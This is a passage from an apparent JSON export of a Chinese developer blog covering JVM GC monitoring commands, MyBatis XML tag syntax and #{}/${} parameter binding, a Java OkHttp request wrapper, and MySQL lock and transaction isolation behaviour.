对象在Survivor区没多经过一次MinorGC，则age+1 当age超过阀值（默认15），就会晋升到老年代 阀值可以通过 -XX:MaxTenuringThreshold来设置 d. 动态对象年龄判定如果在Survivor空间中相同年龄所有对象的大小的总和，大于Survivor空间的一半，则年龄大于或等于该年龄的对象就可以进入老年代，无序等Age达到阀值 e. 空间分配担保在发生MinorGC之前，虚拟机会先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果成立，则Minor GC可以确保总是安全的； 否则，查看 HandlePromotionFailure参数，是否允许担保失败 若允许，则继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，若大于，则尝试MinorGC 否则进行FullGC 3. jstat 命令简介 既然问题是频繁的gc引起的，那么观察新生代，老年代对象占用空间的情况就不可避免了，所以jstat命令不得不出现了 截一个线程图 1234567$ jstat -gcutil 11573 1000 5 S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 0.00 34.39 24.68 68.01 98.12 96.30 3051 170.096 242 18.429 188.525 0.00 34.39 26.29 68.01 98.12 96.30 3051 170.096 242 18.429 188.525 0.00 34.39 27.45 68.01 98.12 96.30 3051 170.096 242 18.429 188.525 0.00 34.39 28.32 68.01 98.12 96.30 3051 170.096 242 18.429 188.525 0.00 34.39 29.93 68.01 98.12 96.30 3051 170.096 242 18.429 188.525 a. 参数说明 -gcutil ： 监视Java对状况，包括Eden区、两个survivor区，老年代，永久代等，已用空间，gc时间等 11573： java进程号 1000： 每1s刷新一次 5： 一共查询5次 b. 输出说明 S0, S1: 表示两个 survivor区 E(Eden) : 新生代Eden O(Old) : 老年代Old M(metaspace) : 元空间,本地内存， 在1.8移除了永久代改成这个 YGC : 程序运行以来，发生Minor GC(Young GC)次数 YGCT : Minor GC 总耗时（单位s) FGC : Full GC的总次数 FGCT : Full GC的总耗时 （单位s) GCT : 所有GC的总耗时 （单位s) III. 监控测试0. 准备a. 首先是获取对应的进程号12jps -ljinfo xxx 抓图 123$ jps -l30916 sun.tools.jps.Jps2909 org.apache.catalina.startup.Bootstrap b. 服务器性能监控命令12## 主要查看cpu和nginx访问的监控tsar --cpu --nginx -i1 -l 抓图: 12345678Time -----------------------cpu---------------------- ----------------------------------nginx---------------------------------Time user sys wait hirq sirq util accept handle reqs active read write wait qps rt03/01/18-11:29:37 16.54 1.50 0.00 0.00 0.00 18.05 2.00 2.00 6.00 15.00 0.00 1.00 14.00 6.00 89.5003/01/18-11:29:38 26.07 1.75 0.00 0.00 0.00 27.82 3.00 3.00 10.00 15.00 0.00 1.00 14.00 10.00 47.1003/01/18-11:29:39 19.60 1.01 0.00 0.00 0.00 20.60 4.00 4.00 11.00 15.00 0.00 1.00 14.00 11.00 37.8203/01/18-11:29:40 28.75 2.50 0.00 0.00 0.25 31.50 2.00 2.00 10.00 15.00 0.00 1.00 14.00 10.00 79.3003/01/18-11:29:41 14.07 1.51 0.00 0.00 0.00 15.58 1.00 1.00 10.00 15.00 0.00 3.00 12.00 10.00 51.3003/01/18-11:29:42 20.60 1.01 0.00 0.00 0.00 21.61 6.00 6.00 13.00 15.00 0.00 1.00 14.00 13.00 44.69 c. jvm内存的监控1jstat -gcutil 4354 1000 抓图: 123456$ jstat -gcutil 2909 1000 S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 29.03 0.00 66.34 16.34 98.57 96.32 200 6.393 0 0.000 6.393 29.03 0.00 66.37 16.34 98.57 96.32 200 6.393 0 0.000 6.393 29.03 0.00 66.50 16.34 98.57 96.32 200 6.393 0 0.000 6.393 29.03 0.00 66.54 16.34 98.57 96.32 200 6.393 0 0.000 6.393 d. 查看内存中对象的个数和大小1jmap -histo 4354 抓图 123456789101112num #instances #bytes class name---------------------------------------------- 1: 78179 181546608 [I 2: 1259 175880312 [S 3: 35915 65527520 [B 4: 242125 40558408 [C 5: 571604 13718496 java.util.concurrent.atomic.AtomicLong 6: 233282 5598768 java.lang.String 7: 55177 5296992 java.util.jar.JarFile$JarFileEntry 8: 119906 3836992 java.util.HashMap$Node 9: 33327 2932776 java.lang.reflect.Method 10: 1147 2303216 [Ljava.util.concurrent.atomic.AtomicLong; e. 压测模拟工具Jmetter 添加线程组 新增http请求 添加监听器中，结果的监控：图形结果，聚合报告，查看结果树，用表格查看结果 http请求中配置参数 协议 域名or IP + 端口号 编码: utf-8 请求方法 + 请求路径 请求参数，支持文件上传，注意编码方式 IV. 参考 Linux系统性能监控工具介绍之-tsar tsar使用说明 JVM调优——之CMS GC日志分析 jvm的GC日志分析 JVM 运行时内存使用情况监控 《深入理解JVM虚拟机》 V. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/03/jvm调优的工具介绍/"},{"title":"Mybatis框架学习之使用篇二：标签语法","text":"Mybatis框架学习之使用篇二：标签语法常用标签的使用姿势小结及参数绑定的三种方式 select update delete insert choose, when, otherwise if bind foreach trim set where I. 结构标签xml中，一般常见的写法如下 123&lt;select id=\"selectByPrimaryKey\" resultMap=\"BaseResultMap\" parameterType=\"java.lang.String\" &gt; selext * from xxx where ...&lt;/select&gt; 1. 结构说明分析上面的demo，三个参数比较重要 id：与dao层接口中定义的方法对应，不允许出现相同id的case resultMap: 出参 resultType: 出参类型 parameterType：传参类型 2. sql片段定义一般我们查询时，大多不建议直接使用 select * 的方式，而是具体的写上查询的列，然后一个问题就来了，每个查询都得写上一遍，不仅麻烦，对于后续表结构标定时，需要改的地方要多，所以就有了sql片段定义 ：通过该标签可定义能复用的sql语句片段，在执行sql语句标签中直接引用即可。这样既可以提高编码效率，还能有效简化代码，提高可读性 实际case 123456789101112131415&lt;sql id=\"poetryEntity\"&gt; id, title, author, content, `explain`, `type`, `tag`, `theme`, `is_deleted` as isDeleted, UNIX_TIMESTAMP(`created_at`) as created, UNIX_TIMESTAMP(`updated_at`) as updated&lt;/sql&gt;&lt;!-- 引用方式 --&gt;&lt;select id=\"queryPoetryById\" parameterType=\"long\" resultType=\"com.git.hui.demo.mybatis.entity.PoetryEntity\"&gt; select &lt;include refid=\"poetryEntity\"/&gt; from poetry where id=#{id}&lt;/select&gt; 3. 常见标签1234- &lt;select&gt; 表示这是一个查询sql- &lt;update&gt; 更新sql- &lt;delete&gt; 删除sql- &lt;insert&gt; 插入sql II. 内部标签1. where通常sql中，所有的where都可以被&lt;where&gt;替换，而这个标签的主要作用是为了防止sql可能出现的异常状况，如以下几种case a. case1 无查询条件1234select * from table where&lt;if test=\"id != null\"&gt; id = #{id}&lt;/if&gt; 当id不存在时，导致上面的sql被解析为 select * from table where, 显然这是一个非法sql b. case2 最前or最后的连接条件1234567select * from table where&lt;if test='id != null'&gt; id = #{id}&lt;/if&gt;&lt;if test='uname != null'&gt; and uname=#{uname}&lt;/if&gt; 当id不存在，uname存在时，上面的sql被解析为 select * from table where and uname=#{uname, 显然也是非法sql 所以，这种场景下，用&lt;where&gt;标签优势就很明显了，在解析时，会根据实际的sql，来决定是否有where，是否去掉前面和后面非法的and/or c. trim标签除了直接使用where标签之外，更常见的一个就是标签了， prefix：前缀 suffix：后缀 prefixOverrides：忽略第一个指定分隔符 suffixOverrides：会略最后一个分隔符 1234567891011121314&lt;select id=\"user\" parameterType=\"user\" resultType=\"User\"&gt; select * from user &lt;trim prefix=\"WHERE\" prefixoverride=\"and | or\"&gt; &lt;if test=\"id!=null and id!=''\"&gt; id=#{id} &lt;/if&gt; &lt;if test=\"name!=null and name!=''\"&gt; and name=#{name} &lt;/if&gt; &lt;if test=\"gender!=null and gender!=''\"&gt; and gender=#{gender} &lt;/if&gt; &lt;/trim&gt;&lt;/select&gt; 2. foreach用于循环的场景，如常见的 xxx in (xxx, xxx) ，通常就是foreach来使用 collection：迭代的参数，一般是个列表or数组，值一般直接为参数名 index： 迭代过程中，元素的别称 open： 开始符号 如( close: 结束符号，如) separator：分割符号 一个实际case如下 接口为： 1List&lt;PoetryEntity&gt; queryPoetryByIds(@Param(\"ids\") List&lt;Long&gt; ids); 对应的sql为 123456789101112&lt;select id=\"queryPoetryByIds\" resultType=\"com.git.hui.demo.mybatis.entity.PoetryEntity\"&gt; select &lt;include refid=\"poetryEntity\"/&gt; from poetry where id IN &lt;foreach collection=\"ids\" index=\"index\" item=\"id\" open=\"(\" separator=\",\" close=\")\"&gt; #{id} &lt;/foreach&gt; limit 500&lt;/select&gt; 3. Choose选择标签，类似java中的switch，一旦其中一个条件匹配，整个choose块结束 一个xml如下 1234567891011121314151617181920&lt;select id=\"getUserList_choose\" resultMap=\"resultMap_user\" parameterType=\"com.yiibai.pojo.User\"&gt; SELECT * FROM User u &lt;where&gt; &lt;choose&gt; &lt;when test=\"username !=null \"&gt; u.username LIKE CONCAT(CONCAT('%', #{username, jdbcType=VARCHAR}),'%') &lt;/when &gt; &lt;when test=\"sex != null and sex != '' \"&gt; AND u.sex = #{sex, jdbcType=INTEGER} &lt;/when &gt; &lt;when test=\"birthday != null \"&gt; AND u.birthday = #{birthday, jdbcType=DATE} &lt;/when &gt; &lt;otherwise&gt; limit 10 &lt;/otherwise&gt; &lt;/choose&gt; &lt;/where&gt; &lt;/select&gt; mybatis的这个选择，基本上和我们的switch语句一样， 对应关系如下 1234567&lt;choose&gt; ---- switch&lt;when&gt;&lt;/when&gt; ---- case cond1&lt;when&gt;&lt;/when&gt; ---- case cond2&lt;otherwise&gt;&lt;/otherwise&gt; ---- default&lt;/choose&gt; 4. if条件判断，在拼装sql时，最常见的就是为了防止传入null的参数，导致拼出一个业务逻辑有问题的sql，用if标签就很有用了 使用姿势也比较简单了，主要是内部的test条件判断 123&lt;if test=\"sex != null and sex != ''\"&gt; and sex=#{sex}&lt;/if&gt; 5. set标签更新的时候使用，同样是为了解决拼装成的sql中，最前面or最后面的英文逗号 1234567891011121314&lt;update id=\"userUpdate\" parameterType=\"user\"&gt; update user &lt;set&gt; &lt;if test=\"id!=null and id!=''\"&gt; id=#{id}, &lt;/if&gt; &lt;if test=\"name!=null and name!=''\"&gt; name=#{name}, &lt;/if&gt; &lt;if test=\"gender!=null and gender!=''\"&gt; gender=#{gender}, &lt;/if&gt; &lt;/set&gt;&lt;/update&gt; 6. bindbind 元素可以从 OGNL 表达式中创建一个变量并将其绑定到上下文 比如对于like查询，需要在参数的前面or后面加上 %， 就可以这么玩： 123456789&lt;select id=\"queryPoetryByContent\" resultType=\"com.git.hui.demo.mybatis.entity.PoetryEntity\"&gt; &lt;bind name=\"pattern\" value=\"'%' + content + '%'\" /&gt; select &lt;include refid=\"poetryEntity\"/&gt; from poetry where content LIKE #{pattern} limit 10&lt;/select&gt; 上面的也可以使用concat来做，如下 12345678&lt;select id=\"queryPoetryByContent\" resultType=\"com.git.hui.demo.mybatis.entity.PoetryEntity\"&gt; select &lt;include refid=\"poetryEntity\"/&gt; from poetry where content LIKE CONCAT(CONCAT('%', #{content}), '%') limit 10&lt;/select&gt; III. 参数替换dao层的参数，是如何传入到xml中的sql语句的呢？ 1. map传递dao层接口参数为map，xml中可以直接通过map中的key，来绑定参数 1public User selectUser(Map paramMap); 假设传入的参数为两个，uname, password 对应的xml为 123&lt;select id=\" selectUser\" resultMap=\"BaseResultMap\"&gt; select * from users where uname = #{uname，jdbcType=VARCHAR} and password=#{password,jdbcType=VARCHAR}&lt;/select&gt; 2. 参数位置替换这种是直接根据参数的索引位置来绑定， {0} 表示第一个参数， {1} 表示第二个参数 1public User selectUser(String uname, String password); 对应的xml 123&lt;select id=\" selectUser\" resultMap=\"BaseResultMap\"&gt; select * from users where uname = #{0} and password=#{1}&lt;/select&gt; 3. 注解指定方式通过 @Param注解，直接指定name，在sql中即可通过name方式引用 1public User selectUser(@Param(\"uname\") String uname, @Param(\"password\") String password); 对应的sql为 123&lt;select id=\" selectUser\" resultMap=\"BaseResultMap\"&gt; select * from users where uname = #{uname，jdbcType=VARCHAR} and password=#{password,jdbcType=VARCHAR}&lt;/select&gt; 4. $#区别使用#传入参数是，sql语句解析是会加上””, 比如 select * from table where name = #{name} ,传入的name为小李，那么最后打印出来的就是 select * from table where name = &quot;小李&quot;，就是会当成字符串来解析 因此在动态排序时，比如 order by column，这个时候务必要用${},因为如果你使用了#{} 区别 #将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号 $将传入的数据直接显示生成在sql中 #方式能够很大程度防止sql注入 $方式无法防止Sql注入 $方式一般用于传入数据库对象，例如传入表名，列名 简单来说，两者区别： $ 是sql替换，直接拼成一条可执行sql； # 是参数替换 IV. 其他项目工程 study-demo 个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/11/Mybatis框架学习之使用篇二：标签语法/"},{"title":"基于OkHttp封装一个简单易用的http工具","text":"基于OkHttp封装一个简单易用的http工具 okHtt更常见的是用在android项目上实现http交互，而java后端，可能更多的使用httpclient；一般来讲，android的包，大部分也是可以用到java后端的，本片博文则主要是介绍如何使用okhttp实现http交互，并会做一个简单的封装，以达到更好的使用体验 本篇为纯工具封装，无原理分析 I. 封装后测试效果一览基本上，最常见的http交互有两个，一个get请求，一个post请求，因此这里也就封装了这两种请求方式，并额外增加一个上传文件的功能，我们可以通过使用case，来看一下我们最终封装后的使用姿势 123456789101112131415161718192021222324252627282930313233343536// 简单的get请求@Testpublic void testGet() { String url = \"https://zbang.online/wx/list\"; try { okhttp3.Response res = HttpWrapper.of(url).get(); if (res.isSuccessful()) { String ans = res.body().string(); System.out.println(\"ans : \" + ans); } } catch (IOException e) { e.printStackTrace(); }} @Testpublic void testUpload() { String url = \"https://zbang.online/wx/qrcode/encode\"; String path = \"/Users/yihui/Desktop/img/test.jpg\"; File file = new File(path); try { Response res = HttpWrapper.of(url) .file(\"image\", file.getName(), \"image/jpeg\", file) .addParam(\"content\", \"http://www.baidu.com\") .addParam(\"size\", \"400\") .upload(); if (res.isSuccessful()) { String str = res.body().string(); System.out.println(\"ans: \" + str); } } catch (IOException e) { e.printStackTrace(); }} 上面给出的是一个上传文件的case，实现主要是借助了builder模式，可以很简单的传递个中参数和配置，最后获取返回的结果，这样设计的好处很明显： 使用简单 阅读方便 II. 封装实现接下来进入正题，如何封装这个工具类呢，一般而言，发起http请求，需要设置请求参数，设置请求头，所以builder内部的元素可以很清晰的定义了 首先是引入依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.squareup.okhttp3&lt;/groupId&gt; &lt;artifactId&gt;okhttp&lt;/artifactId&gt; &lt;version&gt;3.9.0&lt;/version&gt;&lt;/dependency&gt; 当然由于整个使用都比较简单，下面就直接贴出封装后的代码了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129public class HttpWrapper { private static OkHttpClient client = new OkHttpClient(); private static final String DEFAULT_USER_AGENT = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\"; public static Builder of(String url) { return new Builder(url); } public static class Builder { private String url; private Map&lt;String, String&gt; params; private List&lt;MultipartBody.Part&gt; uploadParts; Request.Builder reqBuilder; Builder(String url) { this.url = url; params = new HashMap&lt;&gt;(); uploadParts = new ArrayList&lt;&gt;(); reqBuilder = new Request.Builder(); // 默认添加上user-agent addHeader(\"User-Agent\", DEFAULT_USER_AGENT); } // 添加参数 public Builder addParam(String key, String value) { params.put(key, value); return this; } // 添加头 public Builder addHeader(String key, String value) { reqBuilder.addHeader(key, value); return this; } public Builder file(String key, String fileName, String fileMime, byte[] bytes) { MultipartBody.Part part = MultipartBody.Part.createFormData( key, fileName, RequestBody.create(MediaType.parse(fileMime), bytes)); uploadParts.add(part); return this; } public Builder file(String key, String fileName, String fileMime, File file) { MultipartBody.Part part = MultipartBody.Part.createFormData( key, fileName, RequestBody.create(MediaType.parse(fileMime), file)); uploadParts.add(part); return this; } public Builder file(String key, String fileName, String fileMime, InputStream stream) throws IOException { int size = stream.available(); byte[] bytes = new byte[size]; stream.read(bytes); return file(key, fileName, fileMime, bytes); } /** * 发送get请求 * * @return * @throws IOException */ public Response get() throws IOException { StringBuilder urlBuilder = new StringBuilder(url); if (!params.isEmpty()) { urlBuilder.append(\"?\").append(Joiner.on('&amp;').withKeyValueSeparator('=').join(params)); } return client.newCall(reqBuilder.url(urlBuilder.toString()).build()).execute(); } /** * post表单数据 * * @return */ public Response post() throws IOException { // 创建表单 FormBody.Builder formBodyBuilder = new FormBody.Builder(); if (!params.isEmpty()) { params.forEach(formBodyBuilder::add); } return client.newCall(reqBuilder.url(url) .post(formBodyBuilder.build()) .build()) .execute(); } /** * 文件上传 * * @return * @throws IOException */ public Response upload() throws IOException { MultipartBody.Builder bodyBuilder = new MultipartBody.Builder() .setType(MultipartBody.FORM); uploadParts.forEach(bodyBuilder::addPart); // 添加参数 params.forEach(bodyBuilder::addFormDataPart); return client.newCall(reqBuilder.url(url) .post(bodyBuilder.build()) .build()) .execute(); } }} 针对上面的实现，有几个需要注意的地方 get请求时，将参数拼装到url上（需要考虑是否要编码？） post请求时，主要借助 FormBody 来存储请求参数 文件上传时， 主要利用Part来封装上传的文件，借助 MultipartBody来包装Part和请求参数 上传文件，需要指定其 MIME（即 Content-Type, 如 image/jpeg, audio/mp3, file/txt等） 传文件的同时，也可以传递post参数，当然url参数也是可以的 III. 测试验证前面给出的是一个传文件的case，下面则给出一个提交post表单的测试用例 这个http接口主要功能是实现markdown输出图片 12345678910111213141516171819202122232425262728293031323334@Testpublic void testPost() { String url = \"https://zbang.online/wx/md2img\"; String content = \"h1 header\\n\" + \"============\\n\" + \"\\n\" + \"Paragraphs are separated by a blank line.\\n\" + \"\\n\" + \"2nd paragraph. *Italic*, **bold**, and `monospace`. Itemized lists\\n\" + \"look like:\\n\" + \"\\n\" + \" * this one\\n\" + \" * that one\\n\" + \" * the other one\"; String token = \"0xdahdljk3u8eqhrjqwer90e\"; String noborder = \"true\"; try { Response res = HttpWrapper.of(url) .addParam(\"content\", content) .addParam(\"token\", token) .addParam(\"noborder\", noborder) .addParam(\"type\", \"stream\") .post(); if (res.isSuccessful()) { BufferedImage bf = ImageIO.read(res.body().byteStream()); System.out.println(\"over\"); } } catch (IOException e) { e.printStackTrace(); }} 测试演示 V. 其他源码相关源码可以参见： HttpWrapper.java 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/15/基于OkHttp封装一个简单易用的http工具/"},{"title":"mysql之锁与事务详解","text":"Mysql之锁与事务平时的业务中，顶多也就是写写简单的sql，连事务都用的少，对锁这一块的了解就更加欠缺了，之前一个大神分享了下mysql的事务隔离级别，感觉挺有意思的，正好发现一个很棒的博文，然后也收集了一些相关知识，正好来学习下，mysql中锁与事务的神秘面纱，主要内容包括 共享锁和排它锁的区别以及适合范围 mysql的表锁和行锁的区别 怎么判断一个sql是否执行了锁，执行的是表锁还是行锁 事务是什么，怎么用 事务的特性ACID 事务的隔离级别 (RU, RC, RR, SER) 如何查看mysql使用的隔离级别 I. 锁在学习多线程时，我们也经常会遇到锁这个东西，那个时候谈的比较多的是乐观锁和悲观锁，那这两种锁和DB中常说的共享锁和独占锁有什么区别呢？先给出我们已知的乐观锁和悲观锁定义 乐观锁：多线程中的CAS就是一种乐观锁，实际上不加锁，先尝试去执行，如果失败则重试（或者根据失败策略进行处理） 悲观锁：上锁，一次只能有一个线程访问，其他的都只能等待 1. 共享锁和排它锁a. 共享锁突出在共享这个关键词上，顾名思义，表示这个锁可以多人共享，一般又可以称为读锁(S锁) 在DB中，读锁表示所有的读取数据的小伙伴都不会被锁阻塞，可以放心大胆的获取数据，专业一点的说法就是同一时刻，允许多个连接并发的读取同一资源 b. 排它锁排它，表示当某个人持有这个锁之后，其他的人再来竞争锁就会失败，只能等待锁释放， 又称为写锁(X锁) 在DB中，写锁表示同一时刻，只能有一个小伙伴操作，其他的不管是读还是写，都得排队，专业说法是写锁会阻塞其他的读锁或写锁请求，确保同一时刻只能有一个连接可以写入资源，并防止其他连接读取或者写资源 c. gapLock 和 next key lock next key lock 主要是范围匹配的场景下，会锁某一个范围区间 gapLock 主要用来锁边界 如下面的case（说明，columnA是非唯一索引，RR隔离级别） where columnA between 10 and 30, next key lock 确保不会在10, 30 之内插入新的数据行 where columnA = 10, gap lock 确保不会再次插入一个columnA=10的行 2. 表锁和行锁对于DB的操作，通常会出现两种情况，一个是锁表，一个锁行 表锁：表示整个表被某一个连接占用了写锁，导致其他连接的读锁或者写锁都会阻塞；影响整个表的读写 行锁：表示表中某些行被某个连接占用了写锁，但是其他行，依然可以被其他的连接请求读锁、写锁；仅影响被锁的那些行数据 那么一个问题就来了，什么sql会导致行锁，什么会导致写锁？甚至我们如何判断一个sql是否会请求锁，请求的是读锁还是写锁呢？ 3. 如何使用锁上面一节抛出了问题，那么现在就是来看下如何使用和分析锁了，首先我们是我们最常见的几个sql select update delete insert 其中很容易得出的结论是 update, delete, insert 三个涉及到写锁；而且这种操作绝大部分的场景是操作具体的某些行（想想为什么?），所以更常见的是行锁 select读操作则有点特殊 a. select分析MVCC(multiple-version-concurrency-control）是个行级锁的变种，它在普通读情况下避免了加锁操作，因此开销更低。即下面这个没有读锁也没有写锁 快照读，不加锁 1select * from table ... 当前读，select 语句可以指定读锁和写锁，如下 12345-- 读锁select * from table lock in share mode;-- 写锁select * from table for update; 说明，insert, update, delete 也是当前读，理由如下： 1.update和delete操作流程分解： 首先通过where条件查询到第一个满足的记录，并加锁 对这条记录进行更新，再读取下一条记录 对记录更新，继续读下一条直到完毕 2.insert操作流程分解： unique key 冲突检测，会有一个当前读 无冲突时，插入 b. sql实例分析12345--- SQL1：select * from t1 where id = 10;--- SQL2：delete from t1 where id = 10; 在分析上面的sql之前，需要明确几个前提： id是否为主键（id是否有索引） 系统的隔离级别（隔离级别是什么东西可以先看下下文介绍） 分别说明: case1: 主键+RC级别 sql1不加锁，MySQL是使用多版本并发控制的，读不加锁 sql2加写锁（即X锁），只锁 id=10这一行 case2: 唯一索引+rc级别 sql2加写锁，如下图的case，就两把锁，一个对应于id unique索引上的id = 10的记录，另一把锁对应于聚簇索引上的[name=’d’,id=10]的记录 case3: id非唯一索引+RC sql2加写锁，如下图的case，会有四个写锁 case4: 无索引+RC sql2分析：若id列上没有索引，SQL会走聚簇索引的全扫描进行过滤，由于过滤是由MySQL Server层面进行的。因此每条记录，无论是否满足条件，都会被加上写锁(X锁)。 但是，为了效率考量，MySQL做了优化，对于不满足条件的记录，会在判断后放锁，最终持有的，是满足条件的记录上的锁，但是不满足条件的记录上的加锁/放锁动作不会省 case5: 主键+RR 加锁同case1 case6: 唯一索引+RR 加锁同case2 case7: 非唯一索引+RR RR级别不允许出现幻读，简单来说，在加锁的过程中，不允许在新增or修改满足条件的记录 即下图中，除了图三中类似的x锁之外，还会新增一个gap锁，这个gap锁主要确保那几个位置上不能插入新的记录 case8: 无索引+RR 在Repeatable Read隔离级别下，如果进行全表扫描的当前读，那么会锁上表中的所有记录，同时会锁上聚簇索引内的所有GAP，杜绝所有的并发 更新/删除/插入 操作 case9: Serializable级别 sql2: Serializable隔离级别。对于SQL2：delete from t1 where id = 10; 来说，Serializable隔离级别与Repeatable Read隔离级别完全一致 SQL1: 在RC，RR隔离级别下，都是快照读，不加锁。但是在Serializable隔离级别，SQL1会加读锁，也就是说快照读不复存在，MVCC并发控制降级为Lock-Based CC II. 事务事务可谓是db中非常重要的一个知识点了，接下来我们的目标就是弄懂什么是事务，怎么使用事务，以及事务与锁之间的关联是怎样的 说明：本文的分析主要是以mysql的innordb存储引擎为标准 1. 定义事务就是一组原子性的sql，或者说一个独立的工作单元。 事务就是说，要么mysql引擎会全部执行这一组sql语句，要么全部都不执行（比如其中一条语句失败的话）。 2. ACID特性a. A:atomiciy 原子性一个事务必须保证其中的操作要么全部执行，要么全部回滚，不可能存在只执行了一部分这种情况出现。 b. C:consistency一致性数据必须保证从一种一致性的状态转换为另一种一致性状态。 c. I:isolation 隔离性在一个事务未执行完毕时，通常会保证其他Session 无法看到这个事务的执行结果 d. D:durability 持久性事务一旦commit，则数据就会保存下来，即使提交完之后系统崩溃，数据也不会丢失 3. 隔离级别前面在分析锁的sql时，就提到了隔离级别，通常有四种： RU, RC, RR, Serializable 在说明这个之前，先了解几个概念 a. 基本概念 脏读：读取到一个事务未提交的数据，因为这个事务最终无法保证一定执行成功，那么读取到的数据就无法保证一定准确 不可重复读：简单来说就是在一个事务中读取的数据可能产生变化，同样的sql，在一个事务中执行多次，可能得到不同的结果 幻读：会话T1事务中执行一次查询，然后会话T2新插入一行记录，这行记录恰好可以满足T1所使用的查询的条件。然后T1又使用相同 的查询再次对表进行检索，但是此时却看到了事务T2刚才插入的新行 加锁读：select * from table ... 的执行是否加了读锁 (这个可以参考上面的sql加锁分析） b. RU: Read Uncommited 未提交读事务中的修改，即使没有提交，对其他会话也是可见的，即表示可能出现脏读，一般数据库都不采用这种方案 c. RC: Read Commited 提交读这个隔离级别保证了一个事务如果没有完全成功（commit执行完），事务中的操作对其他会话是不可见的，避免了脏读的可能 但是可能出现不可重复度的情况，举例说明： 会话T1, 执行查询 select * from where id=1，第一次返回一个结果 会话T2, 执行修改 update table set updated=xxx where id=1 并提交 会话T1，再次执行查询 select * from where id=1，这次返回的结果中update字段就和前面的不一样了 实际的生产环境中，这个级别用的比较多，特意查了下公司的db隔离级别就是这个 一个RC级别的演示过程： 会话1，开启事务，查询 会话2，开启事务，更新DB，提交事务 会话1，再次查询，提交事务 从下面的实际演示结果可以知道，会话1，同一个sql，两次执行的结果不同 相关的sql代码如下: 12345678910111213141516171819202122232425262728293031-- 设置会话隔离级别set session transaction ioslation read commited;-- 查看当前会话隔离级别select @@tx_isolation;-- 会话1的操作start transaction;select * from newuser where userId=1;-- 会话2开始操作start transaction;select * from newuser where userId=1;update newuser set updated=1521786092 where userId=1;select * from newuser where userId=1;commit;-- 再次进入会话1，同样执行上次的sql，对比两次输出结果select * from newuser where userId=1;-- 注意观察，会话1，前后两次这个sql的输出结果，特别是updated字段-- 正常情况会如上面的demo图，会发生改变-- 关闭会话commit;-- 再次查询select * from newuser where userId=1; d. RR: Repeatable Read 可重复度一个事务中多次执行统一读SQL,返回结果一样。 这个隔离级别解决了脏读的问题，幻读问题 实例演示解决脏读的过程(将上面的过程同样来一次） 发现不管会话1同一个sql，返回的结果都是相同的 e. Serializable 可串行化最强的隔离级别，通过给事务中每次读取的行加锁，写加写锁，保证不产生幻读问题，但是会导致大量超时以及锁争用问题。 f. 常用命令 查看当前会话隔离级别: select @@tx_isolation 查看系统当前隔离级别: select @@global.tx_isolation 设置当前会话隔离级别: set session transaction isolation level read committed; 设置系统当前隔离级别: set global transaction isolation level read committed; 命令行， 开始事务: start transactioin; 提交: commit; 4. 使用姿势前面演示事务隔离级别的时候，给出的实例就演示了事务的使用姿势，一般作为三步骤： 开始事务 start transaction; 执行你的业务sql 提交事务 commit; 我们现在演示以下一个事务中，读锁、写锁对另一个事务的影响 a. 读锁的影响我们采用mysql默认的RR级别进行测试，userId为主键 1234567891011121314151617-- 会话1start transaction;select * from newuser where userId=1 lock in share mode;-- 转入会话2start transaction;select * from newuser where userId=1; -- 会输出select * from newuser where userId=1 lock in share mode; -- 会输出update newuser set updated=1521787137 where userId=1; -- 会挂起-- 转入会话1-- 提交, 此时观察会话2的写是否完成commit;-- 转入会话2commit; 实际执行演示: b. 写锁的影响1234567891011121314151617-- 会话1start transaction;select * from newuser where userId=1 for update;-- 转入会话2start transaction;select * from newuser where userId=1; -- 会输出select * from newuser where userId=1 lock in share mode; -- 会挂住-- update newuser set updated=1521787137 where userId=1; -- 会挂住-- 转入会话1-- 提交, 此时观察会话2的写是否完成commit;-- 转入会话2commit; 实际执行演示: c. 小结 读锁，会阻塞其他请求写锁的sql执行 写锁，会阻塞其他读锁和写锁的sql执行 事务只有在提交之后，才会释放锁 额外注意，上面事务在提交之后才会释放锁，因此如果两个事务循环依赖锁时，可能发生死锁 III. 小结锁和事务可谓是db中非常重要的知识点了，在我们实际的编码过程中（一般针对mysql, innordb存储引擎，rr隔离级别），做出下面的一些总结 1. sql分析 select * from table where xxx; （读快照，一般不加锁） select * from table where xxx lock in share mode; (读锁，会阻塞其他的写锁请求，但其他的读锁请求没有影响） select * from table where xxx for update; (写锁，会阻塞其他的读写请求） update tableName set xxx (写锁） insert （写锁） delete （写锁） 2. 事务简单来讲，事务就是一组sql，要么全部执行成功，要么全部失败 四个特性： A(原子性)C(一致性)I(隔离性)D (持久性) 四种隔离级别：(mysql 默认采用的是RR级别) 隔离级别 脏读 不可重复读 幻读 加锁读 read uncommited 可能 可能 可能 无 read commited 不可能 可能 可能 无 repeatable read 不可能 不可能 不可能 无 serializable 不可能 不可能 不可能 有 使用姿势： 12345start transaction;-- xxx 具体的sqlcommit; IV. 其他参考 深入理解Mysql——锁、事务与并发控制 MySQL 加锁处理分析 个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/23/mysql之锁与事务详解/"},{"title":"4. 